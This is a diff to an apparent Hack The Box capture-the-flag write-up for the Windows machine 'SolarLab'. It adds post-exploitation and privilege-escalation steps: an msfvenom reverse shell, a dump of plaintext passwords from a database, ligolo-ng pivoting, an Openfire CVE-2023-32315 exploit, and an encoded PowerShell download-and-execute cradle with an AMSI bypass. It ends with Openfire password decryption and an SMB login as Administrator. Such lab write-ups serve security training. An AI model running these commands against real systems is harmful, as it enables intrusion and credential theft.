@@ -4,9 +4,9 @@ banner: /avatars/solar-lab.webp
 difficulty: medium
 os: windows
 releaseDate: 2024-05-11
-pwnDate: 2024-05-12
+pwnDate: 2024-05-18
 slug: "solar-lab"
-achievement: 
+achievement: https://www.hackthebox.com/achievement/machine/701907/601
 ---
 
 import Browser from "@/components/Browser.astro" 
@@ -192,15 +192,431 @@ PS C:\Users\blake\Documents\app> cat ../../Desktop/user.txt
 ## Post Exploitation
 
 ```bash
+msfconsole -q
+[*] Starting persistent handler(s)...
 ```
 
 ```bash
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set lhost tun0
+lhost => tun0
+msf6 exploit(multi/handler) > set lport 7000
+lport => 7000
+msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
+payload => windows/x64/shell_reverse_tcp
+```
+
+```bash
+msf6 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+Payload options (windows/x64/shell_reverse_tcp):
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     tun0             yes       The listen address (an interface may be specified)
+   LPORT     7000             yes       The listen port
+
+Exploit target:
+   Id  Name
+   --  ----
+   0   Wildcard Target
+```
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=7000 -a x64 -f exe -o shell.exe
+```
+
+```bash
+python3 -m http.server 80
+
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.16 - - [17/May/2024 16:44:11] "GET /shell.exe HTTP/1.1" 200 -
+```
+
+```bash
+PS C:\Users\blake\Documents> wget http://10.10.14.9/shell.exe -o shell.exe
+```
+
+```bash
+msf6 exploit(multi/handler) > run -j
+[*] Started reverse TCP handler on 10.10.14.9:7000 
+[*] Command shell session 2 opened (10.10.14.9:7000 -> 10.10.11.16:61285) at 2024-05-17 16:49:25 -0400
+sessions
+
+Active sessions
+===============
+  Id  Name  Type               Information                                                      Connection
+  --  ----  ----               -----------                                                      ----------
+  2         shell x64/windows  Shell Banner: Microsoft Windows [Version 10.0.19045.4355] -----  10.10.14.9:7000 -> 10.10.11.16:61285 (10.10.11.16)
+```
+
+```bash
+PS C:\Users\blake\Documents> ./shell.exe
+```
+
+```bash
+msf6 exploit(multi/handler) > sessions -i 2
+[*] Starting interaction with 2...
+
+
+Shell Banner:
+Microsoft Windows [Version 10.0.19045.4355]
+-----
+          
+
+C:\Users\blake\Documents>
+```
+
+```bash
+C:\Users\blake\Documents\app\instance>download ./users.db ./users.db
+
+[*] Download ./users.db => ./users.db
+[+] Done
+```
+
+```bash
+sqlite3 users.db
+SQLite version 3.45.1 2024-01-30 16:01:20
+Enter ".help" for usage hints.
+sqlite> .dump
+PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+CREATE TABLE user (
+        id INTEGER NOT NULL, 
+        username VARCHAR(50) NOT NULL, 
+        password VARCHAR(100) NOT NULL, 
+        PRIMARY KEY (id), 
+        UNIQUE (username)
+);
+INSERT INTO user VALUES(1,'blakeb','ThisCanB3typedeasily1@');
+INSERT INTO user VALUES(2,'claudias','007poiuytrewq');
+INSERT INTO user VALUES(3,'alexanderk','HotP!fireguard');
+COMMIT;
+```
+
+| username | password | 
+| -------- | -------- | 
+| blakeb   | ThisCanB3typedeasily1@ |
+| claudias | 007poiuytrewq |
+| alexanderk | HotP!fireguard |
+
+```bash
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.16 - - [17/May/2024 17:04:01] "GET /winpeasx64.exe HTTP/1.1" 200 -
+```
+
+```bash
+PS C:\Users\blake\Documents> wget http://10.10.14.9/winpeasx64.exe -o winpeasx64.exe
+```
+
+  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
+
+  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4816            nginx
+  TCP        0.0.0.0               135           0.0.0.0               0               Listening         900             svchost
+  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         1052            svchost
+  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               6791          0.0.0.0               0               Listening         4816            nginx
+  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         672             lsass
+  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         520             wininit
+  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1028            svchost
+  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         1564            svchost
+  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         664             services
+  TCP        10.10.11.16           139           0.0.0.0               0               Listening         4               System
+  TCP        10.10.11.16           61279         10.10.14.9            5000            Established       2040            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  TCP        10.10.11.16           61285         10.10.14.9            7000            Established       5708            C:\Users\blake\Documents\shell.exe
+  TCP        10.10.11.16           61286         10.10.14.9            7000            Established       724             C:\Users\blake\Documents\shell.exe
+  TCP        127.0.0.1             5000          0.0.0.0               0               Listening         2288            C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.11_3.11.1776.0_x64__qbz5n2kfra8p0\python3.11.exe
+  TCP        127.0.0.1             5222          0.0.0.0               0               Listening         2056            openfire-service
+  TCP        127.0.0.1             5223          0.0.0.0               0               Listening         2056            openfire-service
+  TCP        127.0.0.1             5262          0.0.0.0               0               Listening         2056            openfire-service
+  TCP        127.0.0.1             5263          0.0.0.0               0               Listening         2056            openfire-service
+  TCP        127.0.0.1             5269          0.0.0.0               0               Listening         2056            openfire-service
+  TCP        127.0.0.1             5270          0.0.0.0               0               Listening         2056            openfire-service
+  TCP        127.0.0.1             5275          0.0.0.0               0               Listening         2056            openfire-service
+  TCP        127.0.0.1             5276          0.0.0.0               0               Listening         2056            openfire-service
+  TCP        127.0.0.1             7070          0.0.0.0               0               Listening         2056            openfire-service
+  TCP        127.0.0.1             7443          0.0.0.0               0               Listening         2056            openfire-service
+  TCP        127.0.0.1             9090          0.0.0.0               0               Listening         2056            openfire-service
+  TCP        127.0.0.1             9091          0.0.0.0               0               Listening         2056            openfire-service
+  TCP        127.0.0.1             49669         127.0.0.1             49670           Established       2056            openfire-service
+  TCP        127.0.0.1             49670         127.0.0.1             49669           Established       2056            openfire-service
+  TCP        127.0.0.1             49671         127.0.0.1             49672           Established       2056            openfire-service
+  TCP        127.0.0.1             49672         127.0.0.1             49671           Established       2056            openfire-service
+  TCP        127.0.0.1             49673         127.0.0.1             49674           Established       2056            openfire-service
+  TCP        127.0.0.1             49674         127.0.0.1             49673           Established       2056            openfire-service
+  TCP        127.0.0.1             49675         127.0.0.1             49676           Established       2056            openfire-service
+  TCP        127.0.0.1             49676         127.0.0.1             49675           Established       2056            openfire-service
+  TCP        127.0.0.1             49677         127.0.0.1             49678           Established       2056            openfire-service
+  TCP        127.0.0.1             49678         127.0.0.1             49677           Established       2056            openfire-service
+  TCP        127.0.0.1             49679         127.0.0.1             49680           Established       2056            openfire-service
+  TCP        127.0.0.1             49680         127.0.0.1             49679           Established       2056            openfire-service
+  TCP        127.0.0.1             49681         127.0.0.1             49682           Established       2056            openfire-service
+  TCP        127.0.0.1             49682         127.0.0.1             49681           Established       2056            openfire-service
+  TCP        127.0.0.1             49683         127.0.0.1             49684           Established       2056            openfire-service
+  TCP        127.0.0.1             49684         127.0.0.1             49683           Established       2056            openfire-service
+  TCP        127.0.0.1             49685         127.0.0.1             49686           Established       2056            openfire-service
+  TCP        127.0.0.1             49686         127.0.0.1             49685           Established       2056            openfire-service
+  TCP        127.0.0.1             49687         127.0.0.1             49688           Established       2056            openfire-service
+  TCP        127.0.0.1             49688         127.0.0.1             49687           Established       2056            openfire-service
+  TCP        127.0.0.1             49689         127.0.0.1             49690           Established       2056            openfire-service
+  TCP        127.0.0.1             49690         127.0.0.1             49689           Established       2056            openfire-service
+  TCP        127.0.0.1             49692         127.0.0.1             49693           Established       2056            openfire-service
+  TCP        127.0.0.1             49693         127.0.0.1             49692           Established       2056            openfire-service
+  TCP        127.0.0.1             49694         127.0.0.1             49695           Established       2056            openfire-service
+  TCP        127.0.0.1             49695         127.0.0.1             49694           Established       2056            openfire-service
+  TCP        127.0.0.1             49697         127.0.0.1             49698           Established       2056            openfire-service
+  TCP        127.0.0.1             49698         127.0.0.1             49697           Established       2056            openfire-service
+  TCP        127.0.0.1             49699         127.0.0.1             49700           Established       2056            openfire-service
+  TCP        127.0.0.1             49700         127.0.0.1             49699           Established       2056            openfire-service
+  TCP        127.0.0.1             49701         127.0.0.1             49702           Established       2056            openfire-service
+  TCP        127.0.0.1             49702         127.0.0.1             49701           Established       2056            openfire-service
+  TCP        127.0.0.1             49703         127.0.0.1             49704           Established       2056            openfire-service
+  TCP        127.0.0.1             49704         127.0.0.1             49703           Established       2056            openfire-service
+  TCP        127.0.0.1             49705         127.0.0.1             49706           Established       2056            openfire-service
+  TCP        127.0.0.1             49706         127.0.0.1             49705           Established       2056            openfire-service
+  TCP        127.0.0.1             49707         127.0.0.1             49708           Established       2056            openfire-service
+  TCP        127.0.0.1             49708         127.0.0.1             49707           Established       2056            openfire-service
+  TCP        127.0.0.1             49709         127.0.0.1             49710           Established       2056            openfire-service
+  TCP        127.0.0.1             49710         127.0.0.1             49709           Established       2056            openfire-service
+  TCP        127.0.0.1             49711         127.0.0.1             49712           Established       2056            openfire-service
+  TCP        127.0.0.1             49712         127.0.0.1             49711           Established       2056            openfire-service
+  TCP        127.0.0.1             49713         127.0.0.1             49714           Established       2056            openfire-service
+  TCP        127.0.0.1             49714         127.0.0.1             49713           Established       2056            openfire-service
+  TCP        127.0.0.1             49715         127.0.0.1             49716           Established       2056            openfire-service
+  TCP        127.0.0.1             49716         127.0.0.1             49715           Established       2056            openfire-service
+  TCP        127.0.0.1             49717         127.0.0.1             49718           Established       2056            openfire-service
+  TCP        127.0.0.1             49718         127.0.0.1             49717           Established       2056            openfire-service
+  TCP        127.0.0.1             61290         127.0.0.1             61291           Established       2288            C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.11_3.11.1776.0_x64__qbz5n2kfra8p0\python3.11.exe
+  TCP        127.0.0.1             61291         127.0.0.1             61290           Established       2288            C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.11_3.11.1776.0_x64__qbz5n2kfra8p0\python3.11.exe
+
+```bash
+C:\Users\blake\Documents>background
+
+Background session 4? [y/N]  y
+msf6 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                                                      Connection
+  --  ----  ----               -----------                                                      ----------
+  4         shell x64/windows  Shell Banner: Microsoft Windows [Version 10.0.19045.4355] -----  10.10.14.9:7000 -> 10.10.11.16:61323 (10.10.11.16)
+
+msf6 exploit(multi/handler) > search shell_to_meterpreter
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
+
+msf6 exploit(multi/handler) > use 0
+msf6 post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                                                      Connection
+  --  ----  ----               -----------                                                      ----------
+  4         shell x64/windows  Shell Banner: Microsoft Windows [Version 10.0.19045.4355] -----  10.10.14.9:7000 -> 10.10.11.16:61323 (10.10.11.16)
+
+msf6 post(multi/manage/shell_to_meterpreter) > set session 4
+session => 4
+msf6 post(multi/manage/shell_to_meterpreter) > run
+
+[*] Upgrading session ID: 4
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.10.14.9:4433 
+[*] Post module execution completed
+msf6 post(multi/manage/shell_to_meterpreter) > 
+[*] Sending stage (201798 bytes) to 10.10.11.16
+[*] Meterpreter session 5 opened (10.10.14.9:4433 -> 10.10.11.16:61326) at 2024-05-17 17:30:38 -0400
+[*] Stopping exploit/multi/handler
+pwd
+[*] exec: pwd
+
+/home/kali
+msf6 post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                                      Connection
+  --  ----  ----                     -----------                                                      ----------
+  4         shell x64/windows        Shell Banner: Microsoft Windows [Version 10.0.19045.4355] -----  10.10.14.9:7000 -> 10.10.11.16:61323 (10.10.11.16)
+  5         meterpreter x64/windows  SOLARLAB\blake @ SOLARLAB                                        10.10.14.9:4433 -> 10.10.11.16:61326 (10.10.11.16)
+
+msf6 post(multi/manage/shell_to_meterpreter) > set session 5
+session => 5
+msf6 post(multi/manage/shell_to_meterpreter) > session -i 5
+[-] Unknown command: session
+msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 5
+[*] Starting interaction with 5...
+```
+
+```bash
+meterpreter > sysinfo
+Computer        : SOLARLAB
+OS              : Windows 10 (10.0 Build 19045).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 4
+Meterpreter     : x64/windows
+```
+
+```bash
+sudo ip tuntap add user [your_username] mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 240.0.0.1/32 dev ligolo
+```
+
+```bash
+ligolo-proxy -selfcert
+WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
+INFO[0000] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _                                                                                                                                                                                  
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                                                                                                                                  
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                                                                                                                                   
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                                                                                                                                    
+        /____/                          /____/                                                                                                                                                                                     
+                                                                                                                                                                                                                                   
+  Made in France ♥            by @Nicocha30!                                                                                                                                                                                       
+                                                                                                                                                                                                                                   
+ligolo-ng » INFO[0021] Agent joined.                                 name="SOLARLAB\\blake@solarlab" remote="10.10.11.16:61404"
+```
+
+```bash
+C:\Users\blake\Documents>agent.exe -connect 10.10.14.9:11601 -ignore-cert
+agent.exe -connect 10.10.14.9:11601 -ignore-cert
+time="2024-05-18T01:01:53+03:00" level=warning msg="warning, certificate validation disabled"
+time="2024-05-18T01:01:53+03:00" level=info msg="Connection established" addr="10.10.14.9:11601"
+```
+
+```bash
+ligolo-ng » session
+? Specify a session : 1 - #1 - SOLARLAB\blake@solarlab - 10.10.11.16:61405
+[Agent : SOLARLAB\blake@solarlab] » ifconfig
+┌───────────────────────────────────────────────┐
+│ Interface 0                                   │
+├──────────────┬────────────────────────────────┤
+│ Name         │ Ethernet0 2                    │
+│ Hardware MAC │ 00:50:56:b9:91:59              │
+│ MTU          │ 1500                           │
+│ Flags        │ up|broadcast|multicast|running │
+│ IPv4 Address │ 10.10.11.16/23                 │
+└──────────────┴────────────────────────────────┘
+┌──────────────────────────────────────────────┐
+│ Interface 1                                  │
+├──────────────┬───────────────────────────────┤
+│ Name         │ Loopback Pseudo-Interface 1   │
+│ Hardware MAC │                               │
+│ MTU          │ -1                            │
+│ Flags        │ up|loopback|multicast|running │
+│ IPv6 Address │ ::1/128                       │
+│ IPv4 Address │ 127.0.0.1/8                   │
+└──────────────┴───────────────────────────────┘
+[Agent : SOLARLAB\blake@solarlab] » tunnel_start
+[Agent : SOLARLAB\blake@solarlab] » INFO[0072] Starting tunnel to SOLARLAB\blake@solarlab
+```
+
+https://github.com/miko550/CVE-2023-32315
+
+```bash
+git clone https://github.com/miko550/CVE-2023-32315.git
+cd CVE-2023-32315
+pip3 install -r requirements.txt
+```
+
+```bash
+python3 CVE-2023-32315.py -t http://240.0.0.1:9090                                              
+
+
+ ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██████╗  ██╗███████╗
+██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗╚════██╗╚════██╗███║██╔════╝
+██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗
+██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚═══██╗██╔═══╝  ╚═══██╗ ██║╚════██║
+╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     ██████╔╝███████╗██████╔╝ ██║███████║
+ ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝      ╚═════╝ ╚══════╝╚═════╝  ╚═╝╚══════╝
+                                                                                                       
+Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215)
+Use at your own risk!
+
+[..] Checking target: http://240.0.0.1:9090
+Successfully retrieved JSESSIONID: node01qdvy7feiplcg1ccb3s58nlo4i1.node0 + csrf: Sb19ksMjoMJTU0m
+User added successfully: url: http://240.0.0.1:9090 username: 31r7xg password: 3vws6i
+```
+
+`31r7xg:3vws6i`
+
+```bash
+msf6 exploit(multi/script/web_delivery) > 
+[*] Started reverse TCP handler on 10.10.14.9:5000 
+[*] Using URL: http://10.10.14.9:7000/W4JWwHn24rJZlB
+[*] Server started.
+[*] Run the following command on the target machine:
+powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB3AEgAYwA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAaQBmACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUAByAG8AeAB5AF0AOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQAUAByAG8AeAB5ACgAKQAuAGEAZABkAHIAZQBzAHMAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAJAB3AEgAYwAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAHcASABjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AOQA6ADcAMAAwADAALwBXADQASgBXAHcASABuADIANAByAEoAWgBsAEIALwAxAGQAUABOADQAbwA3AFUAVAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AOQA6ADcAMAAwADAALwBXADQASgBXAHcASABuADIANAByAEoAWgBsAEIAJwApACkAOwA=
+[*] 10.10.11.16      web_delivery - Delivering AMSI Bypass (1416 bytes)
+[*] 10.10.11.16      web_delivery - Delivering Payload (3719 bytes)
+[*] Sending stage (201798 bytes) to 10.10.11.16
+[*] Meterpreter session 1 opened (10.10.14.9:5000 -> 10.10.11.16:61542) at 2024-05-17 18:48:02 -0400
+sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  SOLARLAB\openfire @ SOLARLAB  10.10.14.9:5000 -> 10.10.11.16:61542 (10.10.11.16)
+
+msf6 exploit(multi/script/web_delivery) > sessions -i 1
+[*] Starting interaction with 1...
+```
+
+"C:\Program Files\Openfire\embedded-db\openfire.script"
+
+```bash
+INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')
+```
+
+https://github.com/c0rdis/openfire_decrypt
+
+```bash
+INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
+```
+
+```bash
+java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
+
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)
 ```
 
 ## Privilege Escalation
 
 ```bash
+smbclient -U Administrator //10.10.11.16/C$ 
+Password for [WORKGROUP\Administrator]:
+Try "help" to get a list of possible commands.
+smb: cd Users/Administrator/Desktop
+smb: \Users\Administrator\Desktop\> get root.txt
+getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
 ```
 
 ```bash
+cat root.txt                                                                      
+e07ec04da78b9f7dcfee9b02c1f1ba54
 ```
